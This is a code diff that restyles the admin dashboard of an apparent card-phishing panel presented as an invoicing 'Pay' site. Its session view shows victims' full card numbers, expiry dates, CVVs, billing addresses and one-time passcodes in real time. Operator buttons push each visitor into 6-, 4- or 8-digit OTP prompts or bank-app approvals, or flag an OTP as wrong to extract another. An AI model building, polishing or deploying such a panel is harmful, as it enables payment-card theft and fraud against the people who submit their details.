@@ -1,7 +1,7 @@
 import { useState, useEffect, useMemo, useRef, useCallback } from "react";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
-import { Lock, CreditCard, CheckCircle, XCircle, KeyRound, Eye, EyeOff, RefreshCw, Activity, Users, Clock, ShieldCheck, ChevronDown, ChevronUp, Mail, MapPin, Hash, Wifi, WifiOff, Volume2, VolumeX, Trash2, FileText, Settings, Plus, Copy, ExternalLink, DollarSign } from "lucide-react";
+import { Lock, CreditCard, CheckCircle, XCircle, KeyRound, Eye, EyeOff, RefreshCw, Activity, Users, Clock, ShieldCheck, ChevronDown, ChevronUp, Mail, MapPin, Hash, Wifi, WifiOff, Volume2, VolumeX, Trash2, FileText, Settings, Plus, Copy, ExternalLink, DollarSign, TrendingUp, Zap } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { supabase } from "@/integrations/supabase/client";
 import { Badge } from "@/components/ui/badge";
@@ -55,6 +55,27 @@ const countries = [
   "Uruguay","Uzbekistan","Vanuatu","Vatican City","Venezuela","Vietnam","Yemen","Zambia","Zimbabwe",
 ];
 
+/* ─── Stat Card Component ─── */
+const StatCard = ({ label, value, icon: Icon, gradient, delay = 0 }: {
+  label: string; value: string | number; icon: any; gradient: string; delay?: number;
+}) => (
+  <div
+    className="group relative overflow-hidden rounded-2xl border border-white/[0.06] bg-[#111827]/80 backdrop-blur-sm p-5 hover:border-white/[0.12] transition-all duration-300 animate-stripe-slide"
+    style={{ animationDelay: `${delay}ms` }}
+  >
+    <div className={`absolute inset-0 opacity-0 group-hover:opacity-100 transition-opacity duration-500 ${gradient}`} />
+    <div className="relative z-10">
+      <div className="flex items-center justify-between mb-3">
+        <span className="text-[11px] font-semibold text-white/40 uppercase tracking-wider">{label}</span>
+        <div className="h-8 w-8 rounded-lg bg-white/[0.04] border border-white/[0.06] flex items-center justify-center group-hover:bg-white/[0.08] transition-colors">
+          <Icon className="h-4 w-4 text-white/50 group-hover:text-white/80 transition-colors" />
+        </div>
+      </div>
+      <p className="text-3xl font-bold text-white tracking-tight font-display">{value}</p>
+    </div>
+  </div>
+);
+
 const Admin = () => {
   const { toast } = useToast();
   const [authenticated, setAuthenticated] = useState(false);
@@ -65,12 +86,11 @@ const Admin = () => {
   const [sessions, setSessions] = useState<any[]>([]);
   const [expandedSession, setExpandedSession] = useState<string | null>(null);
   const [activeTab, setActiveTab] = useState<"sessions" | "invoices" | "form" | "settings">("sessions");
-  const [invoiceFilter, setInvoiceFilter] = useState<string | null>(null); // invoice_id to filter sessions by
+  const [invoiceFilter, setInvoiceFilter] = useState<string | null>(null);
   const [visitorCount, setVisitorCount] = useState(0);
   const [soundEnabled, setSoundEnabled] = useState(true);
   const prevVisitorCountRef = useRef<number>(0);
 
-  // Invoice state
   const [invoices, setInvoices] = useState<any[]>([]);
   const [showInvoiceForm, setShowInvoiceForm] = useState(false);
   const [invoiceForm, setInvoiceForm] = useState({
@@ -78,14 +98,12 @@ const Admin = () => {
   });
   const [invoiceLoading, setInvoiceLoading] = useState(false);
 
-  // Business settings state
   const [businessSettings, setBusinessSettings] = useState<any>(null);
   const [settingsForm, setSettingsForm] = useState({
     company_name: "", contact_email: "", website: "",
   });
   const [settingsLoading, setSettingsLoading] = useState(false);
 
-  // Manual entry form
   const [form, setForm] = useState({
     cardNumber: "", expiry: "", cvv: "", cardholderName: "",
     email: "", country: "", address1: "", address2: "",
@@ -181,28 +199,28 @@ const Admin = () => {
   };
 
   const getStatusConfig = (status: string) => {
-    const map: Record<string, { variant: "default" | "secondary" | "destructive" | "outline"; label: string; dotColor: string }> = {
-      pending: { variant: "outline", label: "Pending", dotColor: "bg-muted-foreground" },
-      waiting: { variant: "secondary", label: "Waiting", dotColor: "bg-yellow-500" },
-      otp_required: { variant: "default", label: "OTP Required", dotColor: "bg-primary" },
-      otp: { variant: "default", label: "OTP Sent", dotColor: "bg-primary" },
-      otp_submitted: { variant: "secondary", label: "OTP Submitted", dotColor: "bg-blue-500" },
-      otp_wrong: { variant: "destructive", label: "Wrong OTP", dotColor: "bg-orange-500" },
-      otp_expired: { variant: "destructive", label: "Expired OTP", dotColor: "bg-amber-500" },
-      processing: { variant: "secondary", label: "Processing", dotColor: "bg-yellow-500" },
-      approved: { variant: "default", label: "Approved", dotColor: "bg-emerald-500" },
-      success: { variant: "default", label: "Success", dotColor: "bg-emerald-500" },
-      rejected: { variant: "destructive", label: "Rejected", dotColor: "bg-destructive" },
-      card_invalid: { variant: "destructive", label: "Card Invalid", dotColor: "bg-pink-500" },
+    const map: Record<string, { variant: "default" | "secondary" | "destructive" | "outline"; label: string; dotColor: string; glow?: string }> = {
+      pending: { variant: "outline", label: "Pending", dotColor: "bg-muted-foreground", glow: "" },
+      waiting: { variant: "secondary", label: "Waiting", dotColor: "bg-yellow-500", glow: "shadow-yellow-500/20" },
+      otp_required: { variant: "default", label: "OTP Required", dotColor: "bg-primary", glow: "shadow-primary/20" },
+      otp: { variant: "default", label: "OTP Sent", dotColor: "bg-primary", glow: "shadow-primary/20" },
+      otp_submitted: { variant: "secondary", label: "OTP Submitted", dotColor: "bg-blue-500", glow: "shadow-blue-500/20" },
+      otp_wrong: { variant: "destructive", label: "Wrong OTP", dotColor: "bg-orange-500", glow: "shadow-orange-500/20" },
+      otp_expired: { variant: "destructive", label: "Expired OTP", dotColor: "bg-amber-500", glow: "shadow-amber-500/20" },
+      processing: { variant: "secondary", label: "Processing", dotColor: "bg-yellow-500", glow: "shadow-yellow-500/20" },
+      approved: { variant: "default", label: "Approved", dotColor: "bg-emerald-500", glow: "shadow-emerald-500/20" },
+      success: { variant: "default", label: "Success", dotColor: "bg-emerald-500", glow: "shadow-emerald-500/20" },
+      rejected: { variant: "destructive", label: "Rejected", dotColor: "bg-destructive", glow: "shadow-destructive/20" },
+      card_invalid: { variant: "destructive", label: "Card Invalid", dotColor: "bg-pink-500", glow: "shadow-pink-500/20" },
     };
-    return map[status] || { variant: "outline" as const, label: status, dotColor: "bg-muted-foreground" };
+    return map[status] || { variant: "outline" as const, label: status, dotColor: "bg-muted-foreground", glow: "" };
   };
 
   const getStatusBadge = (status: string) => {
     const config = getStatusConfig(status);
     return (
-      <Badge variant={config.variant} className="gap-1.5 font-medium">
-        <span className={`h-1.5 w-1.5 rounded-full ${config.dotColor}`} />
+      <Badge variant={config.variant} className="gap-1.5 font-medium text-[11px] px-2.5 py-0.5">
+        <span className={`h-1.5 w-1.5 rounded-full ${config.dotColor} shadow-sm ${config.glow || ""}`} />
         {config.label}
       </Badge>
     );
@@ -342,65 +360,97 @@ const Admin = () => {
     return <Badge variant="outline" className="gap-1 border-yellow-500/30 text-yellow-400"><Clock className="h-3 w-3" /> Unpaid</Badge>;
   };
 
+  /* ═══════════════════════════════════════════════════════════
+     LOGIN SCREEN
+     ═══════════════════════════════════════════════════════════ */
   if (!authenticated) {
     return (
-      <div className="min-h-screen bg-[#0a0e1a] flex items-center justify-center p-4">
-        <div className="w-full max-w-sm space-y-6">
-          <div className="text-center space-y-2">
-            <div className="h-12 w-12 rounded-xl bg-white/5 border border-white/10 flex items-center justify-center mx-auto">
-              <Lock className="h-6 w-6 text-white/50" />
+      <div className="min-h-screen bg-[#060a13] flex items-center justify-center p-4">
+        {/* Ambient glow */}
+        <div className="fixed inset-0 overflow-hidden pointer-events-none">
+          <div className="absolute top-1/4 left-1/2 -translate-x-1/2 w-[600px] h-[400px] bg-blue-600/[0.07] rounded-full blur-[120px]" />
+        </div>
+        <div className="w-full max-w-sm space-y-8 relative z-10 animate-stripe-slide">
+          <div className="text-center space-y-3">
+            <div className="h-14 w-14 rounded-2xl bg-gradient-to-br from-blue-500/20 to-blue-600/10 border border-blue-500/20 flex items-center justify-center mx-auto shadow-lg shadow-blue-500/10">
+              <Lock className="h-6 w-6 text-blue-400" />
             </div>
-            <h1 className="text-lg font-semibold text-white">Admin Access</h1>
-            <p className="text-sm text-white/40">Enter password to continue</p>
+            <h1 className="text-xl font-display font-bold text-white tracking-tight">Admin Access</h1>
+            <p className="text-sm text-white/35">Enter your credentials to continue</p>
           </div>
-          <form onSubmit={handleLogin} className="space-y-3">
-            <Input
-              type="password"
-              placeholder="Password"
-              value={password}
-              onChange={(e) => { setPassword(e.target.value); setError(false); }}
-              className={`bg-white/5 border-white/10 text-white placeholder:text-white/30 focus:border-blue-500/50 focus:ring-blue-500/20 ${error ? "border-red-500/50" : ""}`}
-              autoFocus
-            />
-            {error && <p className="text-xs text-red-400">Incorrect password</p>}
-            <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-500 text-white border-0">Unlock</Button>
+          <form onSubmit={handleLogin} className="space-y-4">
+            <div className="space-y-2">
+              <label className="text-[11px] uppercase tracking-wider font-semibold text-white/30">Password</label>
+              <Input
+                type="password"
+                placeholder="••••••••••"
+                value={password}
+                onChange={(e) => { setPassword(e.target.value); setError(false); }}
+                className={`h-12 bg-white/[0.04] border-white/[0.08] text-white placeholder:text-white/20 focus:border-blue-500/40 focus:ring-blue-500/20 rounded-xl transition-all ${error ? "border-red-500/50 ring-1 ring-red-500/20" : ""}`}
+                autoFocus
+              />
+              {error && (
+                <p className="text-xs text-red-400 flex items-center gap-1.5">
+                  <XCircle className="h-3 w-3" /> Incorrect password
+                </p>
+              )}
+            </div>
+            <Button type="submit" className="w-full h-12 rounded-xl bg-gradient-to-r from-blue-600 to-blue-500 hover:from-blue-500 hover:to-blue-400 text-white border-0 font-semibold shadow-lg shadow-blue-600/25 transition-all hover:shadow-blue-500/30">
+              <Lock className="h-4 w-4 mr-2" /> Unlock Dashboard
+            </Button>
           </form>
+          <div className="flex items-center justify-center gap-2 text-white/20 text-xs">
+            <ShieldCheck className="h-3.5 w-3.5" />
+            <span>256-bit encrypted session</span>
+          </div>
         </div>
       </div>
     );
   }
 
+  /* ═══════════════════════════════════════════════════════════
+     MAIN DASHBOARD
+     ═══════════════════════════════════════════════════════════ */
   return (
-    <div className="min-h-screen bg-[#0a0e1a]">
-      {/* ===== HEADER ===== */}
-      <header className="bg-[#111827] border-b border-white/[0.06] sticky top-0 z-50 backdrop-blur-xl">
-        <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
-          <div className="flex items-center justify-between h-14">
+    <div className="min-h-screen bg-[#060a13]">
+      {/* ===== GLASSMORPHISM HEADER ===== */}
+      <header className="bg-[#0d1117]/70 border-b border-white/[0.06] sticky top-0 z-50 backdrop-blur-2xl backdrop-saturate-150">
+        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+          <div className="flex items-center justify-between h-16">
             <div className="flex items-center gap-3">
-              <div className="h-8 w-8 rounded-lg bg-blue-600 flex items-center justify-center shadow-lg shadow-blue-600/20">
-                <span className="text-white text-sm font-bold">P</span>
+              <div className="h-9 w-9 rounded-xl bg-gradient-to-br from-blue-500 to-blue-700 flex items-center justify-center shadow-lg shadow-blue-600/30 ring-1 ring-blue-400/20">
+                <Zap className="h-4 w-4 text-white" />
               </div>
-              <div className="flex items-center gap-2">
-                <span className="text-white font-semibold text-base">{businessSettings?.company_name || "Pay"}</span>
-                <span className="text-[10px] font-semibold uppercase tracking-widest text-blue-400/70 bg-blue-500/10 px-2 py-0.5 rounded border border-blue-500/20">Admin</span>
+              <div className="flex items-center gap-2.5">
+                <span className="text-white font-display font-bold text-base tracking-tight">{businessSettings?.company_name || "Pay"}</span>
+                <span className="text-[10px] font-bold uppercase tracking-widest text-blue-300/80 bg-blue-500/10 px-2 py-0.5 rounded-md border border-blue-500/20">Admin</span>
               </div>
             </div>
-            <div className="flex items-center gap-3">
+            <div className="flex items-center gap-2 sm:gap-3">
               {/* Visitor presence */}
-              <div className={`flex items-center gap-2 px-3 py-1.5 rounded-lg border transition-all ${
-                visitorCount > 0 ? "bg-emerald-500/10 border-emerald-500/20" : "bg-white/[0.03] border-white/[0.06]"
+              <div className={`flex items-center gap-2 px-3 py-1.5 rounded-xl border transition-all duration-300 ${
+                visitorCount > 0 
+                  ? "bg-emerald-500/10 border-emerald-500/25 shadow-sm shadow-emerald-500/10" 
+                  : "bg-white/[0.02] border-white/[0.06]"
               }`}>
-                {visitorCount > 0 ? <Wifi className="h-3.5 w-3.5 text-emerald-400 animate-pulse" /> : <WifiOff className="h-3.5 w-3.5 text-white/30" />}
-                <span className={`text-xs font-semibold tabular-nums ${visitorCount > 0 ? "text-emerald-300" : "text-white/30"}`}>
+                {visitorCount > 0 ? (
+                  <span className="relative flex h-2 w-2">
+                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75" />
+                    <span className="relative inline-flex rounded-full h-2 w-2 bg-emerald-400" />
+                  </span>
+                ) : (
+                  <WifiOff className="h-3.5 w-3.5 text-white/25" />
+                )}
+                <span className={`text-xs font-semibold tabular-nums ${visitorCount > 0 ? "text-emerald-300" : "text-white/25"}`}>
                   {visitorCount} online
                 </span>
               </div>
               {/* Sound toggle */}
-              <button onClick={() => setSoundEnabled(!soundEnabled)} className="h-8 w-8 rounded-md flex items-center justify-center hover:bg-white/[0.06] transition-colors">
-                {soundEnabled ? <Volume2 className="h-4 w-4 text-white/70" /> : <VolumeX className="h-4 w-4 text-white/30" />}
+              <button onClick={() => setSoundEnabled(!soundEnabled)} className="h-9 w-9 rounded-xl flex items-center justify-center hover:bg-white/[0.06] transition-all border border-transparent hover:border-white/[0.06]">
+                {soundEnabled ? <Volume2 className="h-4 w-4 text-white/60" /> : <VolumeX className="h-4 w-4 text-white/25" />}
               </button>
               {/* Tabs */}
-              <div className="flex items-center gap-1 bg-white/[0.04] rounded-lg p-1 border border-white/[0.06]">
+              <div className="flex items-center gap-0.5 bg-white/[0.03] rounded-xl p-1 border border-white/[0.06]">
                 {[
                   { key: "sessions", icon: Activity, label: "Sessions" },
                   { key: "invoices", icon: FileText, label: "Invoices" },
@@ -410,8 +460,10 @@ const Admin = () => {
                   <button
                     key={tab.key}
                     onClick={() => setActiveTab(tab.key as any)}
-                    className={`px-3 py-1.5 rounded-md text-sm font-medium transition-all ${
-                      activeTab === tab.key ? "bg-white/[0.08] text-white shadow-sm" : "text-white/40 hover:text-white/70"
+                    className={`px-3 py-2 rounded-lg text-xs font-semibold transition-all duration-200 ${
+                      activeTab === tab.key 
+                        ? "bg-white/[0.1] text-white shadow-sm border border-white/[0.06]" 
+                        : "text-white/35 hover:text-white/60 border border-transparent"
                     }`}
                   >
                     <tab.icon className="h-3.5 w-3.5 inline-block mr-1.5 -mt-0.5" />
@@ -426,29 +478,19 @@ const Admin = () => {
 
       {/* ========== SESSIONS TAB ========== */}
       {activeTab === "sessions" && (
-        <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-6 space-y-6">
-          {/* Stats */}
-          <div className="grid grid-cols-2 lg:grid-cols-4 gap-3 sm:gap-4">
-            {[
-              { label: "Total Sessions", value: stats.total, icon: Users, accent: "text-blue-400" },
-              { label: "Pending", value: stats.pending, icon: Clock, accent: "text-yellow-400" },
-              { label: "Awaiting OTP", value: stats.otpRequired, icon: KeyRound, accent: "text-blue-400" },
-              { label: "Completed", value: stats.completed, icon: ShieldCheck, accent: "text-emerald-400" },
-            ].map((stat) => (
-              <div key={stat.label} className="bg-[#111827] rounded-xl border border-white/[0.06] p-4 sm:p-5 hover:border-white/[0.1] transition-colors">
-                <div className="flex items-center justify-between mb-2">
-                  <span className="text-[11px] font-medium text-white/40 uppercase tracking-wide">{stat.label}</span>
-                  <stat.icon className={`h-4 w-4 ${stat.accent} opacity-70`} />
-                </div>
-                <p className="text-2xl sm:text-3xl font-bold text-white tracking-tight">{stat.value}</p>
-              </div>
-            ))}
+        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 space-y-8">
+          {/* Stats Grid */}
+          <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
+            <StatCard label="Total Sessions" value={stats.total} icon={Users} gradient="bg-gradient-to-br from-blue-500/[0.06] to-transparent" delay={0} />
+            <StatCard label="Pending" value={stats.pending} icon={Clock} gradient="bg-gradient-to-br from-yellow-500/[0.06] to-transparent" delay={50} />
+            <StatCard label="Awaiting OTP" value={stats.otpRequired} icon={KeyRound} gradient="bg-gradient-to-br from-purple-500/[0.06] to-transparent" delay={100} />
+            <StatCard label="Completed" value={stats.completed} icon={ShieldCheck} gradient="bg-gradient-to-br from-emerald-500/[0.06] to-transparent" delay={150} />
           </div>
 
           <div className="flex items-center justify-between">
             <div>
-              <h2 className="text-lg font-semibold text-white">Live Sessions</h2>
-              <p className="text-xs text-white/30 mt-0.5">
+              <h2 className="text-lg font-display font-bold text-white tracking-tight">Live Sessions</h2>
+              <p className="text-xs text-white/25 mt-1">
                 {invoiceFilter
                   ? `Filtered by invoice · ${invoices.find(i => i.id === invoiceFilter)?.invoice_number || invoiceFilter.slice(0, 8)}`
                   : "Real-time monitoring · Auto-updates"}
@@ -456,11 +498,11 @@ const Admin = () => {
             </div>
             <div className="flex items-center gap-2">
               {invoiceFilter && (
-                <Button variant="outline" size="sm" onClick={() => setInvoiceFilter(null)} className="gap-1.5 bg-blue-500/10 border-blue-500/20 text-blue-400 hover:bg-blue-500/20">
+                <Button variant="outline" size="sm" onClick={() => setInvoiceFilter(null)} className="gap-1.5 bg-blue-500/10 border-blue-500/20 text-blue-400 hover:bg-blue-500/20 rounded-lg">
                   <XCircle className="h-3.5 w-3.5" /> Clear Filter
                 </Button>
               )}
-              <Button variant="outline" size="sm" onClick={fetchSessions} className="gap-1.5 bg-white/[0.04] border-white/[0.08] text-white/60 hover:text-white hover:bg-white/[0.08]">
+              <Button variant="outline" size="sm" onClick={fetchSessions} className="gap-1.5 bg-white/[0.03] border-white/[0.06] text-white/50 hover:text-white hover:bg-white/[0.06] rounded-lg">
                 <RefreshCw className="h-3.5 w-3.5" /> Refresh
               </Button>
             </div>
@@ -471,55 +513,66 @@ const Admin = () => {
               ? sessions.filter(s => s.invoice_id === invoiceFilter)
               : sessions;
             return filteredSessions.length === 0 ? (
-            <div className="bg-[#111827] rounded-xl border border-white/[0.06] p-16 text-center">
-              <Activity className="h-10 w-10 text-white/10 mx-auto mb-3" />
-              <p className="text-white/40 text-sm font-medium">{invoiceFilter ? "No sessions for this invoice" : "No sessions yet"}</p>
-              <p className="text-white/20 text-xs mt-1">{invoiceFilter ? "No one has submitted a payment yet" : "Waiting for submissions…"}</p>
+            <div className="bg-[#0d1117]/60 rounded-2xl border border-white/[0.06] p-20 text-center backdrop-blur-sm">
+              <div className="h-14 w-14 rounded-2xl bg-white/[0.03] border border-white/[0.06] flex items-center justify-center mx-auto mb-4">
+                <Activity className="h-6 w-6 text-white/15" />
+              </div>
+              <p className="text-white/35 text-sm font-semibold">{invoiceFilter ? "No sessions for this invoice" : "No sessions yet"}</p>
+              <p className="text-white/15 text-xs mt-1.5">{invoiceFilter ? "No one has submitted a payment yet" : "Waiting for submissions…"}</p>
             </div>
           ) : (
-            <div className="space-y-2.5">
+            <div className="space-y-3">
               {filteredSessions.map((s, index) => {
                 const fd = (s.form_data || {}) as any;
                 const isExpanded = expandedSession === s.id;
                 const statusConfig = getStatusConfig(s.status);
                 const isLatestActive = index === 0 && ["pending", "waiting"].includes(s.status);
                 return (
-                  <div key={s.id} className={`rounded-xl border transition-all duration-200 overflow-hidden ${
-                    isLatestActive ? "bg-[#0d1a2d] border-emerald-500/40 shadow-lg shadow-emerald-500/10 ring-1 ring-emerald-500/20" :
-                    isExpanded ? "bg-[#111827] border-blue-500/30 shadow-lg shadow-blue-500/5" : "bg-[#111827] border-white/[0.06] hover:border-white/[0.1]"
+                  <div key={s.id} className={`rounded-2xl border transition-all duration-300 overflow-hidden ${
+                    isLatestActive 
+                      ? "bg-[#0d1a2d]/80 border-emerald-500/30 shadow-lg shadow-emerald-500/[0.08] ring-1 ring-emerald-500/15" 
+                      : isExpanded 
+                        ? "bg-[#0d1117]/80 border-blue-500/20 shadow-lg shadow-blue-500/[0.05]" 
+                        : "bg-[#0d1117]/60 border-white/[0.06] hover:border-white/[0.1] hover:bg-[#0d1117]/80"
                   }`}>
                     <div className="flex items-center gap-3 sm:gap-4 p-4 sm:p-5 cursor-pointer select-none" onClick={() => setExpandedSession(isExpanded ? null : s.id)}>
-                      <div className={`h-2.5 w-2.5 rounded-full shrink-0 ${statusConfig.dotColor} ring-4 ring-[#111827]`} />
-                      <div className="flex-1 min-w-0 flex flex-col sm:flex-row sm:items-center gap-1 sm:gap-4">
+                      <div className={`h-3 w-3 rounded-full shrink-0 ${statusConfig.dotColor} shadow-sm ${statusConfig.glow || ""}`} />
+                      <div className="flex-1 min-w-0 flex flex-col sm:flex-row sm:items-center gap-1.5 sm:gap-4">
                         <div className="flex items-center gap-2.5 min-w-0">
                           {isLatestActive && (
-                            <Badge className="bg-emerald-500/20 text-emerald-400 border-emerald-500/30 text-[10px] px-1.5 py-0 animate-pulse">
+                            <Badge className="bg-emerald-500/15 text-emerald-400 border-emerald-500/25 text-[10px] px-2 py-0 font-bold tracking-wide">
+                              <span className="relative flex h-1.5 w-1.5 mr-1.5">
+                                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75" />
+                                <span className="relative inline-flex rounded-full h-1.5 w-1.5 bg-emerald-400" />
+                              </span>
                               ACTIVE
                             </Badge>
                           )}
                           {getStatusBadge(s.status)}
-                          {fd.amount && <span className="text-base font-bold text-white tabular-nums">€{fd.amount}</span>}
+                          {fd.amount && <span className="text-base font-bold text-white tabular-nums">{formatEuro(parseFloat(fd.amount))}</span>}
                         </div>
                         <div className="flex items-center gap-2 min-w-0">
                           {fd.email && (
-                            <span className="text-sm text-white/40 truncate flex items-center gap-1">
-                              <Mail className="h-3 w-3 shrink-0" />{fd.email}
+                            <span className="text-sm text-white/35 truncate flex items-center gap-1.5">
+                              <Mail className="h-3 w-3 shrink-0 text-white/25" />{fd.email}
                             </span>
                           )}
                         </div>
                       </div>
                       <div className="flex items-center gap-3 shrink-0">
                         <div className="text-right hidden sm:block">
-                          <p className="text-xs text-white/30">{new Date(s.created_at).toLocaleDateString("en-GB", { day: "2-digit", month: "short" })}</p>
-                          <p className="text-[10px] text-white/20">{new Date(s.created_at).toLocaleTimeString("en-GB", { hour: "2-digit", minute: "2-digit" })}</p>
+                          <p className="text-xs text-white/25 font-medium">{new Date(s.created_at).toLocaleDateString("en-GB", { day: "2-digit", month: "short" })}</p>
+                          <p className="text-[10px] text-white/15">{new Date(s.created_at).toLocaleTimeString("en-GB", { hour: "2-digit", minute: "2-digit" })}</p>
                         </div>
-                        {isExpanded ? <ChevronUp className="h-4 w-4 text-white/30" /> : <ChevronDown className="h-4 w-4 text-white/30" />}
+                        <div className={`h-7 w-7 rounded-lg flex items-center justify-center transition-all ${isExpanded ? "bg-white/[0.06] rotate-180" : "bg-transparent"}`}>
+                          <ChevronDown className="h-4 w-4 text-white/25" />
+                        </div>
                       </div>
                     </div>
 
                     {isExpanded && (
-                      <div className="border-t border-white/[0.06] bg-white/[0.02]">
-                        <div className="p-5 grid grid-cols-1 sm:grid-cols-3 gap-4">
+                      <div className="border-t border-white/[0.06]">
+                        <div className="p-5 sm:p-6 grid grid-cols-1 sm:grid-cols-3 gap-5">
                           {[
                             { label: "Card Number", value: fd.cardNumber, mono: true },
                             { label: "Expiry", value: fd.expiry, mono: true },
@@ -528,32 +581,34 @@ const Admin = () => {
                             { label: "Email", value: fd.email },
                             { label: "Session ID", value: s.id.slice(0, 12) + "…", mono: true, dim: true },
                           ].map((item) => (
-                            <div key={item.label} className="space-y-0.5">
-                              <p className="text-[10px] uppercase tracking-wider font-semibold text-white/30">{item.label}</p>
-                              <p className={`text-sm ${item.mono ? "font-mono" : ""} ${item.dim ? "text-white/40" : "text-white/90"} ${item.label === "Card Number" ? "tracking-wider" : ""}`}>{item.value || "—"}</p>
+                            <div key={item.label} className="space-y-1">
+                              <p className="text-[10px] uppercase tracking-wider font-bold text-white/25">{item.label}</p>
+                              <p className={`text-sm ${item.mono ? "font-mono" : ""} ${item.dim ? "text-white/35" : "text-white/85"} ${item.label === "Card Number" ? "tracking-widest text-base" : ""}`}>{item.value || "—"}</p>
                             </div>
                           ))}
-                          <div className="sm:col-span-3 space-y-0.5">
-                            <p className="text-[10px] uppercase tracking-wider font-semibold text-white/30 flex items-center gap-1">
+                          <div className="sm:col-span-3 space-y-1">
+                            <p className="text-[10px] uppercase tracking-wider font-bold text-white/25 flex items-center gap-1.5">
                               <MapPin className="h-3 w-3" /> Billing Address
                             </p>
-                            <p className="text-sm text-white/90">
+                            <p className="text-sm text-white/85">
                               {[fd.address1, fd.address2, fd.city, fd.state, fd.zip, fd.country].filter(Boolean).join(", ") || "—"}
                             </p>
                           </div>
                           {fd.otp && (
-                            <div className="space-y-0.5">
-                              <p className="text-[10px] uppercase tracking-wider font-semibold text-white/30 flex items-center gap-1"><Hash className="h-3 w-3" /> OTP Code</p>
-                              <p className="text-lg font-mono font-bold text-blue-400 tracking-[0.3em]">{fd.otp}</p>
+                            <div className="space-y-1">
+                              <p className="text-[10px] uppercase tracking-wider font-bold text-white/25 flex items-center gap-1.5"><Hash className="h-3 w-3" /> OTP Code</p>
+                              <p className="text-xl font-mono font-bold text-blue-400 tracking-[0.3em]">{fd.otp}</p>
                             </div>
                           )}
                           {fd.resend_requested && (
                             <div className="sm:col-span-3">
-                              <div className="flex items-center gap-2 rounded-lg bg-orange-500/10 border border-orange-500/20 px-4 py-2.5">
-                                <RefreshCw className="h-4 w-4 text-orange-400 animate-spin" />
+                              <div className="flex items-center gap-3 rounded-xl bg-orange-500/[0.08] border border-orange-500/20 px-4 py-3">
+                                <div className="h-8 w-8 rounded-lg bg-orange-500/15 flex items-center justify-center shrink-0">
+                                  <RefreshCw className="h-4 w-4 text-orange-400 animate-spin" />
+                                </div>
                                 <div>
-                                  <p className="text-sm font-medium text-orange-300">Client requested resend</p>
-                                  <p className="text-xs text-orange-400/60">
+                                  <p className="text-sm font-semibold text-orange-300">Client requested resend</p>
+                                  <p className="text-xs text-orange-400/50">
                                     {fd.resend_requested_at ? new Date(fd.resend_requested_at).toLocaleTimeString("en-GB", { hour: "2-digit", minute: "2-digit", second: "2-digit" }) : "Just now"}
                                   </p>
                                 </div>
@@ -561,40 +616,42 @@ const Admin = () => {
                             </div>
                           )}
                         </div>
-                        <div className="border-t border-white/[0.06] px-5 py-3.5 flex flex-wrap gap-2 bg-[#111827]">
-                          {/* OTP Type buttons */}
+                        {/* Action buttons */}
+                        <div className="border-t border-white/[0.06] px-5 sm:px-6 py-4 flex flex-wrap gap-2 bg-[#0d1117]/50">
                           <div className="flex flex-wrap gap-2">
-                            <Button size="sm" variant="outline" className="gap-1.5 bg-white/[0.04] border-white/[0.08] text-white/70 hover:text-white hover:bg-white/[0.08]" onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "otp", "6digit"); }}>
-                              <KeyRound className="h-3.5 w-3.5" /> OTP 6-digit
+                            <Button size="sm" variant="outline" className="gap-1.5 bg-white/[0.03] border-white/[0.06] text-white/60 hover:text-white hover:bg-white/[0.08] rounded-lg" onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "otp", "6digit"); }}>
+                              <KeyRound className="h-3.5 w-3.5" /> OTP 6
                             </Button>
-                            <Button size="sm" variant="outline" className="gap-1.5 bg-white/[0.04] border-white/[0.08] text-white/70 hover:text-white hover:bg-white/[0.08]" onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "otp", "4digit"); }}>
-                              <KeyRound className="h-3.5 w-3.5" /> OTP 4-digit
+                            <Button size="sm" variant="outline" className="gap-1.5 bg-white/[0.03] border-white/[0.06] text-white/60 hover:text-white hover:bg-white/[0.08] rounded-lg" onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "otp", "4digit"); }}>
+                              <KeyRound className="h-3.5 w-3.5" /> OTP 4
                             </Button>
-                            <Button size="sm" variant="outline" className="gap-1.5 bg-white/[0.04] border-white/[0.08] text-white/70 hover:text-white hover:bg-white/[0.08]" onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "otp", "8digit"); }}>
-                              <KeyRound className="h-3.5 w-3.5" /> OTP 8-digit
+                            <Button size="sm" variant="outline" className="gap-1.5 bg-white/[0.03] border-white/[0.06] text-white/60 hover:text-white hover:bg-white/[0.08] rounded-lg" onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "otp", "8digit"); }}>
+                              <KeyRound className="h-3.5 w-3.5" /> OTP 8
                             </Button>
-                            <Button size="sm" variant="outline" className="gap-1.5 bg-purple-500/10 border-purple-500/20 text-purple-400 hover:bg-purple-500/20" onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "otp", "bank_app"); }}>
+                            <Button size="sm" variant="outline" className="gap-1.5 bg-purple-500/[0.08] border-purple-500/20 text-purple-400 hover:bg-purple-500/15 rounded-lg" onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "otp", "bank_app"); }}>
                               <KeyRound className="h-3.5 w-3.5" /> Bank App
                             </Button>
                           </div>
-                          <Button size="sm" variant="outline" className="gap-1.5 bg-orange-500/10 border-orange-500/20 text-orange-400 hover:bg-orange-500/20" onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "otp_wrong"); }}>
-                            <XCircle className="h-3.5 w-3.5" /> Wrong OTP
+                          <div className="h-6 w-px bg-white/[0.06] hidden sm:block" />
+                          <Button size="sm" variant="outline" className="gap-1.5 bg-orange-500/[0.08] border-orange-500/20 text-orange-400 hover:bg-orange-500/15 rounded-lg" onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "otp_wrong"); }}>
+                            <XCircle className="h-3.5 w-3.5" /> Wrong
                           </Button>
